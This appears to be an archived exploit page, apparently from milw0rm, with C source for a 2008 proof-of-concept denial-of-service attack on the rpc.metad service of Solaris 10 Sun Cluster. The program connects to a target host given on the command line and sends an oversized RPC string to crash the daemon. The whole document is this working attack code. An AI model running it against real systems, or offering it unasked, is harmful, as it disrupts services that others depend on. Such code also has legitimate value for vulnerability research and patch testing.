<html><head><title>SunOS 5.10 Sun Cluster rpc.metad Denial of Service PoC</title></head><pre>/*##########################################################*/
/*## SunOS 5.10 Sun Cluster rpc.metad DoS PoC              #*/
/*## causes DoS on rpc.metad                     	   #*/
/*## (C) 2008 - Kingcope                                   #*/
/*##########################################################*/
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;rpc/rpc.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;

extern int optarg;

#define METAD_PROG 100229
#define METAD_VERS 2
#define METAD_FUNC 6

typedef struct{char *string;}req_t;

bool_t xdr_req(XDR *xdrs,req_t *obj){
    if(!xdr_string(xdrs,&amp;obj-&gt;string,~0)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[30000],address[4],*b,*cmd;
    int i,c,n,flag=1,vers=0,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req_t req;

    printf(&quot;rpc.metad for solaris 10\n\n&quot;);

    if(argc&lt;2){
        printf(&quot;usage: %s address\n&quot;,argv[0]);
        exit(-1);
    }

    printf(&quot;Using version %d and request no. %d!!\n&quot;, METAD_VERS, METAD_FUNC);

    printf(&quot;timeout=%d &quot;,ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror(&quot;error&quot;);exit(-1);
        }
        memcpy(&amp;adr.sin_addr.s_addr,hp-&gt;h_addr,4);
    }

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&amp;adr,METAD_PROG,METAD_VERS,&amp;sck,0,0))){
        clnt_pcreateerror(&quot;error&quot;);exit(-1);
    }
    cl-&gt;cl_auth=authunix_create(&quot;localhost&quot;,0,0,0,NULL);

    memset(buffer, 'A', sizeof(buffer)); //buffer can also be small,this is not a bufover
    buffer[3000]=0;

    req.string=buffer;

    stat=clnt_call(cl,METAD_FUNC,xdr_req,&amp;req,xdr_void,NULL,tm);
    if(stat==RPC_SUCCESS) {printf(&quot;\nerror: not vulnerable\n&quot;);
    printf(&quot;sent!\n&quot;); /* if(!flag) exit(0);*/

    }
}

// milw0rm.com [2008-03-14]</pre></html>